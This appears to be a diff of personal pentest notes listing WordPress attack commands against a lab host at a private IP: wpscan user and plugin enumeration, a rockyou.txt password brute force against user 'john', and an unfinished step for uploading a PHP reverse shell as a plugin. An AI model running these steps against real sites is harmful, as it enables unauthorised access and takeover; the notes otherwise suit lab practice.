@@ -1,18 +1,21 @@
-__Wordpress commands__
+Wordpress commands
+==================
 
-1 - Enumerating users 
-=====================
+__1 - Enumerating users __
+
 wpscan --disable-tls-checks --url https://192.168.1.6:12380/blogblog -e u\
 
-#2 - Bruteforce wp login page #
+__2 - Bruteforce wp login page ___
 wpscan --disable-tls-checks --url https://192.168.1.6:12380/blogblog -P /usr/share/wordlists/rockyou.txt --usernames john
 
-#3 - Enumerating wordpress users and plugins #
+__3 - Enumerating wordpress users and plugins __
 wpscan --disable-tls-checks --url https://192.168.1.30:12380/blogblog/ --plugin-agressive (To be checked)
 
 
-__Reverse shell exploits__
-#4 - Exploit Method 1#
+Reverse shell exploits
+======================
+
+__Exploit Method 1__
 
 If the admin login of wordpress is available, upload the famous php-reverse shell.php as plugin.
 Download and Edit the following file content
